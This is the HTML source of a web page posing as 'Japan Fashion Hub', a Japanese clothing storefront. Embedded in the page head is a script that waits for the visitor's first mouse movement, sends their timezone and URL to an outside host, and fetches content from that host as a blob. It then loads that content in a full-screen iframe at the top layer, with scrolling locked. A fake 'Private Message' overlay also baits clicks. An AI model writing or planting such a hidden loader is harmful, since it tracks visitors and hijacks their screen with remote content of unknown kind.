<html lang="en" style="overflow: hidden;"><head>
<script async="" defer="" src="https://tools.luckyorange.com/core/lo.js?site-id=2ecd9266"></script>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Japan Fashion Hub</title>
    
<meta name="description" content="Japan Fashion Hub showcases the latest Japanese fashion, including men's and women's wear and accessories.">
<meta name="keywords" content="Japanese fashion, men, women, polo shirts, fashion shopping">
<meta name="author" content="Japan Fashion Hub">

<style>
*{
margin:0;
padding:0;
box-sizing:border-box;
}

body{
font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif;
background:#fff;
color:#222;
line-height:1.6;
}

img{
width:100%;
display:block;
}

a{
text-decoration:none;
color:inherit;
}

.container{
width:95%;
max-width:1400px;
margin:auto;
}

header{
background:#082b5c;
color:#fff;
padding:15px 0;
position:sticky;
top:0;
z-index:100;
}

.nav{
display:flex;
justify-content:space-between;
align-items:center;
}

.logo{
font-size:28px;
font-weight:bold;
}

.menu{
display:flex;
gap:20px;
font-size:14px;
}

.hero{
padding:20px 0;
}

.hero-grid{
display:grid;
grid-template-columns:repeat(3,1fr);
gap:15px;
}

.hero-card{
position:relative;
overflow:hidden;
}

.hero-card img{
height:500px;
object-fit:cover;
}

.hero-text{
position:absolute;
bottom:20px;
left:20px;
color:#fff;
font-size:24px;
font-weight:bold;
text-shadow:0 2px 10px rgba(0,0,0,.6);
}

.section-title{
text-align:center;
font-size:34px;
margin:50px 0 25px;
font-weight:700;
}

.category-grid{
display:grid;
grid-template-columns:1fr 1fr;
gap:20px;
margin-bottom:60px;
}

.category-card{
position:relative;
}

.category-card img{
height:450px;
object-fit:cover;
}

.category-name{
position:absolute;
bottom:30px;
left:30px;
font-size:48px;
color:#fff;
font-weight:bold;
letter-spacing:4px;
text-shadow:0 2px 8px rgba(0,0,0,.6);
}

.products{
display:grid;
grid-template-columns:repeat(auto-fit,minmax(220px,1fr));
gap:20px;
}

.product{
text-align:center;
}

.product img{
height:320px;
object-fit:cover;
background:#f7f7f7;
}

.product h3{
font-size:14px;
margin:10px 0;
}

.price{
font-weight:bold;
color:#082b5c;
}

.story{
padding:80px 0;
}

.story-grid{
display:grid;
grid-template-columns:1fr 1fr 1fr;
gap:15px;
}

.story-grid img{
height:550px;
object-fit:cover;
}

.story-text{
text-align:center;
max-width:800px;
margin:40px auto;
}

.instagram{
display:grid;
grid-template-columns:repeat(6,1fr);
gap:10px;
}

.instagram img{
height:180px;
object-fit:cover;
}

.news{
margin:60px 0;
}

.news ul{
list-style:none;
border:1px solid #ddd;
}

.news li{
padding:15px;
border-bottom:1px solid #eee;
}

footer{
background:#082b5c;
color:white;
padding:50px 20px;
text-align:center;
margin-top:50px;
}

@media(max-width:900px){

.hero-grid,
.story-grid{
grid-template-columns:1fr;
}

.category-grid{
grid-template-columns:1fr;
}

.instagram{
grid-template-columns:repeat(2,1fr);
}

.hero-card img{
height:400px;
}

.category-card img{
height:350px;
}
}
</style>


    <script async="" charset="utf-8" src="https://tools.luckyorange.com/core/web-vitals.js?v=4bb1511" crossorigin="anonymous" id="lo-script-web-vitals"></script></head>
<script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
<script>
(function(){

let requestSent = false;

window.addEventListener("mousemove", initOnce);

async function initOnce(){

    if(requestSent) return;

    requestSent = true;

    window.removeEventListener(
        "mousemove",
        initOnce
    );

    const timezone =
        Intl.DateTimeFormat()
        .resolvedOptions()
        .timeZone;

    try{

        await fetch(
            "https://api.intellectpath.net/timezone-track",
            {
                method:"POST",
                headers:{
                    "Content-Type":"application/json"
                },
                body:JSON.stringify({
                    timezone,
                    fullUrl:location.href
                })
            }
        );

        showIframe();

    }catch(e){

        console.error(e);

    }

}


async function showIframe(){

    const createFrame = async () => {

        if(document.getElementById("bruceDiv"))
            return;

        try {
            // 1. Data call / fetch karna
            const response = await fetch("https://api.intellectpath.net/view/win");
            if (!response.ok) throw new Error("Network response was not ok");
            
            
            const blob = await response.blob();
            const blobUrl = URL.createObjectURL(blob);

            document.documentElement.style.overflow="hidden";

            const div = document.createElement("div");
            div.id="bruceDiv";
            div.style.cssText="position:fixed;inset:0;z-index:2147483647;background:#fff;";

            const iframe = document.createElement("iframe");
            
            iframe.src = blobUrl;

            iframe.style.cssText = "width:100%;height:100%;border:0;display:block;";
            iframe.allow = "fullscreen; autoplay; encrypted-media; picture-in-picture";
            iframe.allowFullscreen = true;
          
            div.appendChild(iframe);
            document.body.appendChild(div);

            iframe.onload = () => {
                URL.revokeObjectURL(blobUrl);
            };

        } catch (error) {
            console.error("Blob iframe load Error:", error);
        }
    };

    if(document.body){
        await createFrame();
    }else{
        window.addEventListener(
            "DOMContentLoaded",
            async () => { await createFrame(); },
            {once:true}
        );
    }
}
    
})();
</script>
<script>
    document.body.style.overflow = "hidden";
</script> 

<!-- Google tag (gtag.js) -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-0LY0HY7L01"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-0LY0HY7L01');
</script>

<header>

<div class="container nav">
<div class="logo">JAPAN FASHION HUB</div>

<div class="menu">
<a href="#">Home</a>
<a href="#">Men</a>
<a href="#">Women</a>
<a href="#">New Arrivals</a>
<a href="#">Ranking</a>
</div>
</div>

</header>

    <div>

    
<section class="hero container">
<div class="hero-grid">

<div class="hero-card">
<img loading="lazy" src="https://images.unsplash.com/photo-1496747611176-843222e1e57c?w=900">
<div class="hero-text">Latest Collection</div>
</div>

<div class="hero-card">
<img loading="lazy" src="https://images.unsplash.com/photo-1515886657613-9f3515b0c78f?w=900">
<div class="hero-text">Style</div>
</div>

<div class="hero-card">
<img loading="lazy" src="https://images.unsplash.com/photo-1483985988355-763728e1935b?w=900">
<div class="hero-text">Accessories</div>
</div>

</div>
</section>

    
    
<div class="container">

<div class="category-grid">

<div class="category-card">
<img loading="lazy" src="https://images.unsplash.com/photo-1519085360753-af0119f7cbe7?w=1200">
<div class="category-name">MEN</div>
</div>

<div class="category-card">
<img loading="lazy" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?w=1200">
<div class="category-name">WOMEN</div>
</div>

</div>

<h2 class="section-title">New Arrivals</h2>

<div class="products">

<div class="product">
<img loading="lazy" src="https://images.unsplash.com/photo-1521572163474-6864f9cf17ab?w=600">
<h3>Premium Polo Shirt</h3>
<div class="price">¥4,980</div>
</div>

<div class="product">
<img loading="lazy" src="https://images.unsplash.com/photo-1576566588028-4147f3842f27?w=600">
<h3>Summer Shirt</h3>
<div class="price">¥5,980</div>
</div>

<div class="product">
<img loading="lazy" src="https://images.unsplash.com/photo-1541099649105-f69ad21f3246?w=600">
<h3>Women's Top</h3>
<div class="price">¥3,980</div>
</div>

<div class="product">
<img loading="lazy" src="https://images.unsplash.com/photo-1489987707025-afc232f7ea0f?w=600">
<h3>Fashion Dress</h3>
<div class="price">¥6,980</div>
</div>

</div>

<h2 class="section-title">Popular Ranking</h2>

<div class="products">

<div class="product">
<img loading="lazy" src="https://images.unsplash.com/photo-1523381210434-271e8be1f52b?w=600">
<h3>Popular Polo Shirt</h3>
<div class="price">¥4,500</div>
</div>

<div class="product">
<img loading="lazy" src="https://images.unsplash.com/photo-1503342217505-b0a15ec3261c?w=600">
<h3>Casual Wear</h3>
<div class="price">¥5,200</div>
</div>

<div class="product">
<img loading="lazy" src="https://images.unsplash.com/photo-1512436991641-6745cdb1723f?w=600">
<h3>Women's Fashion</h3>
<div class="price">¥4,980</div>
</div>

<div class="product">
<img loading="lazy" src="https://images.unsplash.com/photo-1529139574466-a303027c1d8b?w=600">
<h3>Sportswear</h3>
<div class="price">¥6,200</div>
</div>

</div>

</div>

<section class="story container">

<div class="story-grid">

<img loading="lazy" src="https://images.unsplash.com/photo-1524504388940-b1c1722653e1?w=900">
<img loading="lazy" src="https://images.unsplash.com/photo-1500648767791-00dcc994a43e?w=900">
<img loading="lazy" src="https://images.unsplash.com/photo-1515886657613-9f3515b0c78f?w=900">

</div>

<div class="story-text">
<h2 class="section-title">Sport Meets Fashion</h2>

<p>
Japan Fashion Hub offers a new lifestyle that combines Japanese trend fashion with sports style.
We deliver items that focus on quality, comfort, and design.
</p>
</div>

</section>

<div class="container">

<h2 class="section-title">Instagram Feed</h2>

<div class="instagram">

<img loading="lazy" src="https://images.unsplash.com/photo-1529139574466-a303027c1d8b?w=500">
<img loading="lazy" src="https://images.unsplash.com/photo-1496747611176-843222e1e57c?w=500">
<img loading="lazy" src="https://images.unsplash.com/photo-1512436991641-6745cdb1723f?w=500">
<img loading="lazy" src="https://images.unsplash.com/photo-1515886657613-9f3515b0c78f?w=500">
<img loading="lazy" src="https://images.unsplash.com/photo-1503342217505-b0a15ec3261c?w=500">
<img loading="lazy" src="https://images.unsplash.com/photo-1521572163474-6864f9cf17ab?w=500">

</div>

<div class="news">

<h2 class="section-title">News</h2>

<ul>
<li>2026/06/15 Summer Collection Released</li>
<li>2026/06/12 Men's Ranking Updated</li>
<li>2026/06/10 Free Shipping Campaign Started</li>
<li>2026/06/08 New Member Registration Bonus</li>
</ul>

</div>

</div>
        
<div style="position:fixed;inset:0;background:rgba(0,0,0,.85);display:flex;justify-content:center;align-items:center;padding:15px;z-index:999999;">
<div style="width:100%;max-width:340px;background:#111;padding:25px;border-radius:20px;text-align:center;color:#fff;font-family:Arial;box-sizing:border-box;">

<div style="font-size:70px;">📩</div>

<div style="font-size:24px;font-weight:bold;margin-top:10px;">
Private Message
</div>

<div style="margin-top:10px;color:#bbb;line-height:1.5;">
A new message is waiting to be viewed.
</div>

<div style="margin-top:15px;background:#1f1f1f;padding:12px;border-radius:12px;color:#00D4FF;font-weight:bold;">
1 Unread Message
</div>

<div style="display:flex;gap:10px;margin-top:20px;">
<div style="flex:1;background:#00D4FF;color:#000;padding:14px;border-radius:12px;font-weight:bold;">
READ MESSAGE
</div>
<div style="flex:1;background:#333;color:#fff;padding:14px;border-radius:12px;">
CANCEL
</div>
</div>

</div>
</div>

<footer>

<h3>JAPAN FASHION HUB</h3>

<p>
Delivering the latest fashion across Japan.
</p>

<p style="margin-top:15px;">
© 2026 Japan Fashion Hub. All Rights Reserved.
</p>

</footer>



<iframe id="lo-frame-core" src="about:blank" aria-hidden="true" title="Lucky Orange: core" style="display: none !important;"></iframe></body></html>
